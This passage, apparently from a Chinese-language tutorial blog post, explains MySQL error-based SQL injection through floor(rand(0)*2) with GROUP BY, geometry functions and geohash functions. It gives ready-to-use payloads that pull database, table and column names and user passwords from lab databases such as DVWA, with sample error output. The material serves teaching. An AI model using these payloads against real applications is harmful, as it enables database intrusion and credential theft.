+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-built_in">FLOOR</span>() 函数返回小于或等于数字的最大整数值。<br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">FLOOR</span>(<span class="hljs-number">3.2</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">floor</span>(<span class="hljs-number">4.8</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">floor</span>(<span class="hljs-number">6.9</span>);<br>分别返回<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span><br></code></pre></td></tr></table></figure>
+
+<p>rand()基础</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs sql">RAND()随机生成一个一个数<br>在报错注入的payload里面我们在里面传入的参数是<span class="hljs-number">0</span>，将<span class="hljs-number">0</span>作为种子<br>rand(<span class="hljs-number">0</span>)这样返回的结果是<span class="hljs-number">0</span>到<span class="hljs-number">1</span><br><span class="hljs-keyword">SELECT</span> RAND(<span class="hljs-number">0</span>) <span class="hljs-keyword">FROM</span> information_schema.tables LIMIT <span class="hljs-number">6</span>;<br>这个执行语句长的很奇怪，information_schema.tables是一个工具表用来控制输出列数的<br>在这个执行语句中输出的结果类似于<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-operator">|</span> RAND(<span class="hljs-number">0</span>)             <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">0.15522042769493574</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">0.620881741513388</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">0.6387474552157777</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">0.33109208227236947</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">0.7392180764481594</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">0.7028141661573334</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-keyword">SELECT</span> RAND(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span> <span class="hljs-keyword">FROM</span> information_schema.tables LIMIT <span class="hljs-number">6</span>;<br>所以使用这个执行语句我们输出的结果控制在<span class="hljs-number">0</span>到<span class="hljs-number">2</span>之间<br>类似于<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------+</span><br><span class="hljs-operator">|</span> RAND(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>          <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">0.3104408553898715</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">1.241763483026776</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1.2774949104315554</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">0.6621841645447389</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1.4784361528963188</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1.4056283323146668</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------+</span><br></code></pre></td></tr></table></figure>
+
+<p>这里基础已经看的差不多了，接下来就是看payload了</p>
+<p>看到最基础的payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,count(*),concat(floor(rand(0)*2),0x3a,database()) x from information_schema.schemata group by x -- - </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"># information_schema.schemata存放这数据库的名字,这个经常用于模拟一个表</span><br></code></pre></td></tr></table></figure>
+
+<p>这个是用来爆出数据库名字的</p>
+<p>floor(rand(0)*2对于这个根据前面的知识可以知道返回的结果肯定是0或者是1，其实是固定的，构造语句执行可以知道</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">+</span><span class="hljs-comment">------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-built_in">FLOOR</span>(RAND(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+</span><br><span class="hljs-operator">|</span>                <span class="hljs-number">0</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>                <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>                <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>                <span class="hljs-number">0</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>                <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>                <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+</span><br>结果就是<span class="hljs-number">011011.</span>.......<br></code></pre></td></tr></table></figure>
+
+<p>可以拿到输出的结果是011011这些值是固定的</p>
+<p>下面就是讲解漏洞产生的原因是什么了</p>
+<p>在前面我们已经知道group by就是分组的作用，其实它还有一个特性就是会创建一个虚拟表用来分组</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sql">假设有这么一张表<br>ID	NAME<br><span class="hljs-number">1</span>	AA<br><span class="hljs-number">2</span>	AA<br><span class="hljs-number">3</span>	BB<br>执行下面这个语句，作用是按姓名分组，统计每个名字出现的次数<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) ,name <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> name; <br>可以得到结果<br>count	name<br><span class="hljs-number">2</span>	AA<br><span class="hljs-number">1</span>	BB<br>之后执行<br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>),<span class="hljs-built_in">floor</span>(RAND(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>) <span class="hljs-keyword">as</span> x <span class="hljs-keyword">from</span> users <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> x<br>前面我们已经知道了<span class="hljs-built_in">floor</span>(RAND(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)返回结果的顺序是<span class="hljs-number">011011.</span>.......<br>下面就是<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>的执行过程<br>查询第一条记录，别名x 产生 键值<span class="hljs-number">0</span>，当键值 <span class="hljs-number">0</span> 不存在虚拟表时，执行插入,此时别名x是一个函数，是变量，在执行插入时，按照<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span>分组之时 又要执行floor函数，得到<span class="hljs-number">1</span> ，故向虚拟表中插入键值<span class="hljs-number">1</span>，count <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br><br>COUNT	x<br><span class="hljs-number">1</span>	<span class="hljs-number">1</span><br>查询第二条记录，别名x产生键值<span class="hljs-number">1</span>，虚拟表中存在<span class="hljs-number">1</span>，则令count <span class="hljs-operator">+</span> <span class="hljs-number">1</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span><br><br>COUNT	x<br><span class="hljs-number">2</span>	<span class="hljs-number">1</span><br>查询第三条记录，别名x产生键值<span class="hljs-number">0</span>，键值<span class="hljs-number">0</span>不存在临时表，执行插入，别名x再次执行得键值<span class="hljs-number">1</span>，由于<span class="hljs-number">1</span>存在于临时表，那么插入之后如下表所示<br><br>COUNT	x<br><span class="hljs-number">2</span>	<span class="hljs-number">1</span><br><span class="hljs-number">1</span>	<span class="hljs-number">1</span><br>由于数据库主键唯一性，现在临时表中存在两个键值为<span class="hljs-number">1</span>，主键冗余，所以报错<br><br>由于数据库报错会将报错原因展示出来，故利用报错来实现注入<br></code></pre></td></tr></table></figure>
+
+<p>是不是很好理解，这样floor报错注入的原理就讲完了</p>
+<p>现在看看总的注入执行语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select count(*),concat(floor(rand(0)*2),database()) x from information_schema.schemata group by x #</span><br><span class="hljs-string">id=1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;dvwa&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) x <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x#<br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; and table_schema=&#x27;</span>dvwa<span class="hljs-string">&#x27; limit 0,1)) x from information_schema.schemata group by x#</span><br><span class="hljs-string">id=1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> concat(<span class="hljs-keyword">user</span>,<span class="hljs-number">0x3a</span>,password) <span class="hljs-keyword">from</span> dvwa.users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) x <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x#<br></code></pre></td></tr></table></figure>
+
+<h3 id="几何函数-mysql"><a href="#几何函数-mysql" class="headerlink" title="几何函数(mysql&lt;&#x3D;5.5)"></a>几何函数(mysql&lt;&#x3D;5.5)</h3><p>注意这个版本限制</p>
+<p>为啥这个可以报错注入</p>
+<p>multipoint()、linestring()、polygon()、geometrycollection() 这些函数是 空间几何函数，它们期望接收符合 WKT（Well-Known Text）格式的几何数据</p>
+<p>合法的WKT数据长这个样子</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 点</span><br>POINT(<span class="hljs-number">1</span> <span class="hljs-number">2</span>)<br><br><span class="hljs-comment">-- 线段</span><br>LINESTRING(<span class="hljs-number">0</span> <span class="hljs-number">0</span>, <span class="hljs-number">1</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span> <span class="hljs-number">2</span>)<br><br><span class="hljs-comment">-- 多点</span><br>MULTIPOINT(<span class="hljs-number">0</span> <span class="hljs-number">0</span>, <span class="hljs-number">1</span> <span class="hljs-number">2</span>)<br><br><span class="hljs-comment">-- 多边形</span><br>POLYGON((<span class="hljs-number">0</span> <span class="hljs-number">0</span>, <span class="hljs-number">10</span> <span class="hljs-number">0</span>, <span class="hljs-number">10</span> <span class="hljs-number">10</span>, <span class="hljs-number">0</span> <span class="hljs-number">10</span>, <span class="hljs-number">0</span> <span class="hljs-number">0</span>))<br></code></pre></td></tr></table></figure>
+
+<p>在这里举一个下面马上要将的几何函数multipolygon</p>
+<p>最简单的一个payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> multipolygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> version())a)b));<br></code></pre></td></tr></table></figure>
+
+<p>可以发现这个payload是需要嵌套三个select的</p>
+<p>现在我们详细的解释一下这个payload</p>
+<p>select version()执行危险的sql语句</p>
+<p>然后</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> version()) a<br></code></pre></td></tr></table></figure>
+
+<p>把第一层的返回值当作一张临时表 a，然后用 SELECT * 取出这个表的所有内容</p>
+<p>别名 a 必须加，MySQL 规定所有派生表必须有别名</p>
+<p>第一次包装结束，下面开始第二次包装</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> version()) a) b<br></code></pre></td></tr></table></figure>
+
+<p>再把第二层的结果包装成临时表 b，继续用 SELECT * 取出</p>
+<p>最后出发报错的函数出现</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">multipolygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> version())a)b));<br></code></pre></td></tr></table></figure>
+
+<p>然后需要使用一个select查询一下，是因为这样满足mysql的语法</p>
+<p>然后有一个问题，为什么需要三层派生嵌套</p>
+<p>因为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">一层嵌套:<br>  multipolygon( (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (子查询) a) )<br>  → MySQL 把整个 (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> ...) 当成一个&quot;子查询表达式&quot;<br>  → 但在几何函数解析阶段，子查询还没被执行<br>  → 几何函数先尝试解析格式，发现不合法，直接报错<br>  → 错误信息里只有原始的 <span class="hljs-keyword">SQL</span> 文本<br><br>两层嵌套:<br>  multipolygon( (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (子查询) a) b) )<br>  → MySQL 发现有两层 <span class="hljs-keyword">SELECT</span>，优化器决定&quot;先执行内层，再传给外层&quot;<br>  → 内层子查询被执行，version() 计算出实际值<br>  → 实际值替换进去后，再传给几何函数<br>  → 几何函数解析失败报错，错误信息里包含实际值<br></code></pre></td></tr></table></figure>
+
+<p>然后这些几何函数的报错注入都差不多的</p>
+<h4 id="multipolygon"><a href="#multipolygon" class="headerlink" title="multipolygon"></a>multipolygon</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>  <span class="hljs-keyword">and</span> multipolygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> version())a)b));<br>ERROR <span class="hljs-number">1367</span> (<span class="hljs-number">22007</span>): Illegal non geometric <span class="hljs-string">&#x27;(select `b`.`version()` from (select &#x27;</span><span class="hljs-number">5.5</span><span class="hljs-number">.44</span><span class="hljs-number">-0</span>ubuntu0<span class="hljs-number">.14</span><span class="hljs-number">.04</span><span class="hljs-number">.1</span><span class="hljs-string">&#x27; AS `version()` from dual) `b`)&#x27;</span> <span class="hljs-keyword">value</span> found during parsing<br></code></pre></td></tr></table></figure>
+
+<p>最后综合的注入流程</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>数据库名<br><br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,multipolygon((select * from(select * from(select database())a)b)) -- -</span><br><span class="hljs-string"></span><br><span class="hljs-string">//当前数据库的表名</span><br><span class="hljs-string"></span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,multipolygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database())a)b)) <span class="hljs-comment">-- -</span><br><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>表的列名<br><br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,multipolygon((select * from(select * from(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; and table_schema=database())a)b)) -- -</span><br><span class="hljs-string"></span><br><span class="hljs-string">//列的内容</span><br><span class="hljs-string"></span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,multipolygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(password) <span class="hljs-keyword">from</span> security.users)a)b)) <span class="hljs-comment">-- -</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint"></a>multipoint</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> multipoint((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> version())a)b));<br>ERROR <span class="hljs-number">1367</span> (<span class="hljs-number">22007</span>): Illegal non geometric <span class="hljs-string">&#x27;(select `b`.`version()` from (select &#x27;</span><span class="hljs-number">5.5</span><span class="hljs-number">.44</span><span class="hljs-number">-0</span>ubuntu0<span class="hljs-number">.14</span><span class="hljs-number">.04</span><span class="hljs-number">.1</span><span class="hljs-string">&#x27; AS `version()` from dual) `b`)&#x27;</span> <span class="hljs-keyword">value</span> found during parsing<br></code></pre></td></tr></table></figure>
+
+<p>这个的完整注入方式与multipolygon一样的，只需要替换一下函数即可</p>
+<h4 id="polygon"><a href="#polygon" class="headerlink" title="polygon"></a>polygon</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> polygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> version())a)b));<br>ERROR <span class="hljs-number">1367</span> (<span class="hljs-number">22007</span>): Illegal non geometric <span class="hljs-string">&#x27;(select `b`.`version()` from (select &#x27;</span><span class="hljs-number">5.5</span><span class="hljs-number">.44</span><span class="hljs-number">-0</span>ubuntu0<span class="hljs-number">.14</span><span class="hljs-number">.04</span><span class="hljs-number">.1</span><span class="hljs-string">&#x27; AS `version()` from dual) `b`)&#x27;</span> <span class="hljs-keyword">value</span> found during parsing<br></code></pre></td></tr></table></figure>
+
+<p>这个也是只需要替换一下函数名即可</p>
+<h4 id="eometrycollection"><a href="#eometrycollection" class="headerlink" title="eometrycollection"></a>eometrycollection</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> geometrycollection((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> version())a)b));<br>ERROR <span class="hljs-number">1367</span> (<span class="hljs-number">22007</span>): Illegal non geometric <span class="hljs-string">&#x27;(select `b`.`version()` from (select &#x27;</span><span class="hljs-number">5.5</span><span class="hljs-number">.44</span><span class="hljs-number">-0</span>ubuntu0<span class="hljs-number">.14</span><span class="hljs-number">.04</span><span class="hljs-number">.1</span><span class="hljs-string">&#x27; AS `version()` from dual) `b`)&#x27;</span> <span class="hljs-keyword">value</span> found during parsing<br></code></pre></td></tr></table></figure>
+
+<p>这个也是只需要替换一下函数即可</p>
+<h4 id="linestring"><a href="#linestring" class="headerlink" title="linestring"></a>linestring</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> linestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> version())a)b));<br>ERROR <span class="hljs-number">1367</span> (<span class="hljs-number">22007</span>): Illegal non geometric <span class="hljs-string">&#x27;(select `b`.`version()` from (select &#x27;</span><span class="hljs-number">5.5</span><span class="hljs-number">.44</span><span class="hljs-number">-0</span>ubuntu0<span class="hljs-number">.14</span><span class="hljs-number">.04</span><span class="hljs-number">.1</span><span class="hljs-string">&#x27; AS `version()` from dual) `b`)&#x27;</span> <span class="hljs-keyword">value</span> found during parsing<br></code></pre></td></tr></table></figure>
+
+<p> 同理还是只需要将函数一换即可</p>
+<h4 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring"></a>multilinestring</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> multilinestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> version())a)b));<br>ERROR <span class="hljs-number">1367</span> (<span class="hljs-number">22007</span>): Illegal non geometric <span class="hljs-string">&#x27;(select `b`.`version()` from (select &#x27;</span><span class="hljs-number">5.5</span><span class="hljs-number">.44</span><span class="hljs-number">-0</span>ubuntu0<span class="hljs-number">.14</span><span class="hljs-number">.04</span><span class="hljs-number">.1</span><span class="hljs-string">&#x27; AS `version()` from dual) `b`)&#x27;</span> <span class="hljs-keyword">value</span> found during parsing<br></code></pre></td></tr></table></figure>
+
+<p>同理</p>
+<p>至此几何函数已经结束了，接下来就是地理哈希类函数的报错注入</p>
+<h3 id="地理哈希类-mysql-5-7-x"><a href="#地理哈希类-mysql-5-7-x" class="headerlink" title="地理哈希类(mysql&gt;&#x3D;5.7.x)"></a>地理哈希类(mysql&gt;&#x3D;5.7.x)</h3><p>注意版本</p>
+<p>首先肯定是原理解释</p>
+<p>这些地理哈希函数都有一个共同点：它们都是 MySQL 的空间地理函数，都期望接收合法的 GeoHash 编码字符串作为输入</p>
+<p>这些函数能接受的字符有哪些？如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">合法字符集	仅包含 <span class="hljs-number">10</span> 个数字 和 <span class="hljs-number">22</span> 个小写字母：<span class="hljs-number">0</span><span class="hljs-number">-9</span>, b, c, d, e, f, g, h, j, k, m, n, p, q, r, s, t, u, v, w, x, y, z<br>注意：字母 a, i, l, o 不在其内。<br></code></pre></td></tr></table></figure>
+
+<p>任何不在这个范围内的字符（比如 ~、@、大写字母）都会导致解析失败</p>
+<p>所有原理感觉就好像xml报错注入</p>
+<p>具体的函数有哪些呢？如下</p>
+<h4 id="ST-LongFromGeoHash"><a href="#ST-LongFromGeoHash" class="headerlink" title="ST_LongFromGeoHash()"></a>ST_LongFromGeoHash()</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> ST_LongFromGeoHash(CONCAT(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">SELECT</span> GROUP_CONCAT(table_name) <span class="hljs-keyword">FROM</span> information_schema.tables <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span>DATABASE())))<br><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> ST_LongFromGeoHash(concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> version())));<br>ERROR <span class="hljs-number">1411</span> (HY000): Incorrect geohash <span class="hljs-keyword">value</span>: <span class="hljs-string">&#x27;~5.7.26&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> ST_LONGFROMGEOHASH<br></code></pre></td></tr></table></figure>
+
+<p>我们可以尝试一下完整的注入过程</p>
